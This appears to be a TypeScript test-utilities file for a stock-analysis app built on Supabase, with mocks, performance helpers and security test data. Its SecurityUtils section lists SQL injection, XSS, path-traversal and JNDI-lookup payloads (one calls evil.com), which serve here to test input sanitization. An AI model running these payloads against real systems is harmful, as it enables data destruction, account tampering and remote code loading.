// Test suite configuration and utilities
// Provides centralized configuration for database testing

import { vi } from 'vitest';

/**
 * Test configuration constants
 */
export const TEST_CONFIG = {
  // Test user IDs
  TEST_USER_ID: '123e4567-e89b-12d3-a456-426614174000',
  TEST_USER_ID_2: '123e4567-e89b-12d3-a456-426614174001',
  ATTACKER_USER_ID: '123e4567-e89b-12d3-a456-426614174002',
  
  // Test timeouts
  TIMEOUT: {
    UNIT: 5000,        // 5 seconds for unit tests
    INTEGRATION: 10000, // 10 seconds for integration tests
    LOAD: 30000,       // 30 seconds for load tests
    SECURITY: 15000,   // 15 seconds for security tests
  },
  
  // Performance thresholds
  PERFORMANCE: {
    MAX_QUERY_TIME: 1000,      // 1 second max for single queries
    MAX_BULK_TIME: 5000,       // 5 seconds max for bulk operations
    MAX_CONCURRENT_TIME: 10000, // 10 seconds max for concurrent operations
    MIN_THROUGHPUT: 100,       // Minimum operations per second
  },
  
  // Load testing parameters
  LOAD_TEST: {
    CONCURRENT_USERS: 100,
    CONCURRENT_OPERATIONS: 500,
    BULK_SIZE: 1000,
    LARGE_DATASET_SIZE: 5000,
    STRESS_OPERATIONS: 50,
  },
  
  // Security test parameters
  SECURITY: {
    MAX_INPUT_SIZE: 100000,    // 100KB max input
    MAX_ARRAY_SIZE: 1000,      // 1000 items max in arrays
    MAX_QUERY_LIMIT: 1000,     // 1000 rows max per query
    TIMING_TOLERANCE: 50,      // 50ms tolerance for timing attacks
  },
} as const;

/**
 * Mock data generators
 */
export const MockDataGenerator = {
  /**
   * Generate mock profile
   */
  profile: (overrides: Partial<any> = {}) => ({
    id: TEST_CONFIG.TEST_USER_ID,
    encrypted_google_api_key: null,
    created_at: '2024-01-01T00:00:00Z',
    updated_at: '2024-01-01T00:00:00Z',
    ...overrides,
  }),

  /**
   * Generate mock analysis
   */
  analysis: (overrides: Partial<any> = {}) => ({
    id: 1,
    user_id: TEST_CONFIG.TEST_USER_ID,
    created_at: '2024-01-01T00:00:00Z',
    ticker_symbol: 'AAPL',
    analysis_context: 'investment' as const,
    trading_timeframe: null,
    synthesis_score: 85,
    convergence_factors: [],
    divergence_factors: [],
    full_report: { summary: 'Test analysis summary with sufficient detail' },
    ...overrides,
  }),

  /**
   * Generate mock analysis input
   */
  analysisInput: (overrides: Partial<any> = {}) => ({
    ticker_symbol: 'AAPL',
    analysis_context: 'investment' as const,
    synthesis_score: 85,
    convergence_factors: [],
    divergence_factors: [],
    full_report: { summary: 'Test analysis summary with sufficient detail' },
    ...overrides,
  }),

  /**
   * Generate mock convergence factor
   */
  convergenceFactor: (overrides: Partial<any> = {}) => ({
    category: 'fundamental',
    description: 'Strong revenue growth',
    weight: 8.5,
    metadata: { growth_rate: 0.15 },
    ...overrides,
  }),

  /**
   * Generate mock divergence factor
   */
  divergenceFactor: (overrides: Partial<any> = {}) => ({
    category: 'technical',
    description: 'Overbought RSI',
    weight: 6.0,
    metadata: { rsi_value: 75 },
    ...overrides,
  }),

  /**
   * Generate bulk mock data
   */
  bulkProfiles: (count: number) => 
    Array.from({ length: count }, (_, i) => 
      MockDataGenerator.profile({
        id: `bulk-${i.toString().padStart(4, '0')}-0000-0000-0000-000000000000`,
      })
    ),

  /**
   * Generate bulk mock analyses
   */
  bulkAnalyses: (count: number, userId: string = TEST_CONFIG.TEST_USER_ID) =>
    Array.from({ length: count }, (_, i) =>
      MockDataGenerator.analysis({
        id: i + 1,
        user_id: userId,
        ticker_symbol: `STOCK${i}`,
        analysis_context: i % 2 === 0 ? 'investment' : 'trading',
        synthesis_score: Math.floor(Math.random() * 100),
      })
    ),
};

/**
 * Common mock setups for Supabase
 */
export const MockSupabase = {
  /**
   * Setup successful authentication mock
   */
  mockAuth: (userId: string = TEST_CONFIG.TEST_USER_ID) => {
    const supabase = vi.hoisted(() => ({
      auth: {
        getUser: vi.fn(),
      },
      from: vi.fn(),
      functions: {
        invoke: vi.fn(),
      },
    }));

    supabase.auth.getUser.mockResolvedValue({
      data: { user: { id: userId } },
      error: null,
    });

    return supabase;
  },

  /**
   * Setup unauthenticated mock
   */
  mockUnauthenticated: () => {
    const supabase = vi.hoisted(() => ({
      auth: {
        getUser: vi.fn(),
      },
      from: vi.fn(),
      functions: {
        invoke: vi.fn(),
      },
    }));

    supabase.auth.getUser.mockResolvedValue({
      data: { user: null },
      error: null,
    });

    return supabase;
  },

  /**
   * Setup successful query chain mock
   */
  mockQueryChain: (data: any, error: any = null) => ({
    select: vi.fn().mockReturnThis(),
    insert: vi.fn().mockReturnThis(),
    update: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    neq: vi.fn().mockReturnThis(),
    gt: vi.fn().mockReturnThis(),
    gte: vi.fn().mockReturnThis(),
    lt: vi.fn().mockReturnThis(),
    lte: vi.fn().mockReturnThis(),
    like: vi.fn().mockReturnThis(),
    ilike: vi.fn().mockReturnThis(),
    in: vi.fn().mockReturnThis(),
    order: vi.fn().mockReturnThis(),
    limit: vi.fn().mockReturnThis(),
    range: vi.fn().mockReturnThis(),
    single: vi.fn().mockResolvedValue({ data, error }),
  }),

  /**
   * Setup error mock
   */
  mockError: (errorCode: string, errorMessage: string) => ({
    select: vi.fn().mockReturnThis(),
    insert: vi.fn().mockReturnThis(),
    update: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    single: vi.fn().mockResolvedValue({
      data: null,
      error: { code: errorCode, message: errorMessage },
    }),
  }),
};

/**
 * Performance testing utilities
 */
export const PerformanceUtils = {
  /**
   * Measure execution time of an async operation
   */
  measureTime: async <T>(operation: () => Promise<T>): Promise<{ result: T; time: number }> => {
    const startTime = Date.now();
    const result = await operation();
    const time = Date.now() - startTime;
    return { result, time };
  },

  /**
   * Run concurrent operations and measure performance
   */
  measureConcurrent: async <T>(
    operations: (() => Promise<T>)[],
    maxConcurrency: number = 10
  ): Promise<{ results: T[]; totalTime: number; avgTime: number }> => {
    const startTime = Date.now();
    
    // Run operations in batches to control concurrency
    const results: T[] = [];
    for (let i = 0; i < operations.length; i += maxConcurrency) {
      const batch = operations.slice(i, i + maxConcurrency);
      const batchResults = await Promise.all(batch.map(op => op()));
      results.push(...batchResults);
    }
    
    const totalTime = Date.now() - startTime;
    const avgTime = totalTime / operations.length;
    
    return { results, totalTime, avgTime };
  },

  /**
   * Assert performance meets thresholds
   */
  assertPerformance: (
    actualTime: number,
    maxTime: number,
    operation: string
  ) => {
    if (actualTime > maxTime) {
      throw new Error(
        `Performance threshold exceeded for ${operation}: ${actualTime}ms > ${maxTime}ms`
      );
    }
  },
};

/**
 * Security testing utilities
 */
export const SecurityUtils = {
  /**
   * Common SQL injection payloads
   */
  SQL_INJECTION_PAYLOADS: [
    "'; DROP TABLE profiles; --",
    "' OR '1'='1",
    "'; INSERT INTO profiles VALUES ('hacked'); --",
    "' UNION SELECT * FROM profiles --",
    "'; UPDATE profiles SET encrypted_google_api_key = 'hacked' --",
    "' OR 1=1 --",
    "'; DELETE FROM analyses; --",
    "' OR EXISTS(SELECT * FROM profiles) --",
  ],

  /**
   * Common XSS payloads
   */
  XSS_PAYLOADS: [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    'javascript:alert("xss")',
    '<iframe src="javascript:alert(1)"></iframe>',
  ],

  /**
   * Malformed UUID attempts
   */
  MALFORMED_UUIDS: [
    'not-a-uuid',
    '123e4567-e89b-12d3-a456-426614174000; DROP TABLE profiles;',
    '123e4567-e89b-12d3-a456-426614174000\'; --',
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '%00%00%00%00',
  ],

  /**
   * Test input sanitization
   */
  testSanitization: (_input: string, sanitized: string) => {
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('</script>');
    expect(sanitized).not.toContain(';');
    expect(sanitized).not.toContain('--');
    expect(sanitized).not.toContain('"');
    expect(sanitized).not.toContain("'");
  },
};

/**
 * Test data cleanup utilities
 */
export const TestCleanup = {
  /**
   * Clear all mocks
   */
  clearMocks: () => {
    vi.clearAllMocks();
  },

  /**
   * Restore all mocks
   */
  restoreMocks: () => {
    vi.restoreAllMocks();
  },

  /**
   * Reset test environment
   */
  resetEnvironment: () => {
    vi.clearAllMocks();
    vi.restoreAllMocks();
  },
};

/**
 * Common test assertions
 */
export const TestAssertions = {
  /**
   * Assert valid UUID format
   */
  assertValidUUID: (uuid: string) => {
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
    expect(uuidRegex.test(uuid)).toBe(true);
  },

  /**
   * Assert valid timestamp format
   */
  assertValidTimestamp: (timestamp: string) => {
    const timestampRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{3})?Z$/;
    expect(timestampRegex.test(timestamp)).toBe(true);
  },

  /**
   * Assert valid ticker symbol format
   */
  assertValidTickerSymbol: (ticker: string) => {
    const tickerRegex = /^[A-Z]{1,5}$/;
    expect(tickerRegex.test(ticker)).toBe(true);
  },

  /**
   * Assert valid synthesis score
   */
  assertValidSynthesisScore: (score: number) => {
    expect(score).toBeGreaterThanOrEqual(0);
    expect(score).toBeLessThanOrEqual(100);
    expect(Number.isInteger(score)).toBe(true);
  },
};